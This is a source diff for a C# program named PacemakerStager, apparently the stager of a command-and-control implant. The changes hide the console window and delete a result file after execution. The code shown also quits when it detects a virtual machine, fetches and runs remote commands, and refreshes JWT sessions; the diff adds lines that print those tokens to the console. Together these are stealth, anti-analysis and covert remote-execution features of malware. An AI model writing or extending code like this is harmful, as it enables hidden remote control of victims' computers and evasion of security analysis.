@@ -103,8 +103,9 @@ namespace PacemakerStager
 
             if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
             {
+                Console.WriteLine("\nold jwt: " + authObj.JwtToken + "\n");
                 bool status = await authObj.refresh();
-
+                Console.WriteLine("\nnew jwt: " + authObj.JwtToken + "\n");
 
                 if (status == false) // false means refresh has expired and needs to reauthenticate...
                 {
@@ -118,7 +119,9 @@ namespace PacemakerStager
                     MainBinaryFormatter.Serialize(stream1, authObj);
                     stream1.Close();
 
-                    await GetAndRunCmd();
+                    resultObj = await GetAndRunCmd();
+
+                    return resultObj;
                 }
 
             }
@@ -229,7 +232,7 @@ namespace PacemakerStager
             var handle = GetConsoleWindow();
 
             // Hide
-            // ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             if (Scanner.IsRunningInVM() == true)
             {
@@ -246,7 +249,6 @@ namespace PacemakerStager
                 Console.WriteLine("Nope!");
                 return;
             }
-
 
             else
             {
@@ -282,9 +284,6 @@ namespace PacemakerStager
                 }
 
 
-                Console.WriteLine("\nDoing something....\n");
-                Thread.Sleep(2000);
-
                 CmdResult resultObj = await GetAndRunCmd();
 
                 if (resultObj.result == null || resultObj.result.Length < 1)
@@ -307,6 +306,8 @@ namespace PacemakerStager
                 await KillSwitch();
 
                 Console.WriteLine("Done");
+                File.Delete("result.txt");
+
                 Console.Read();
             }
         }
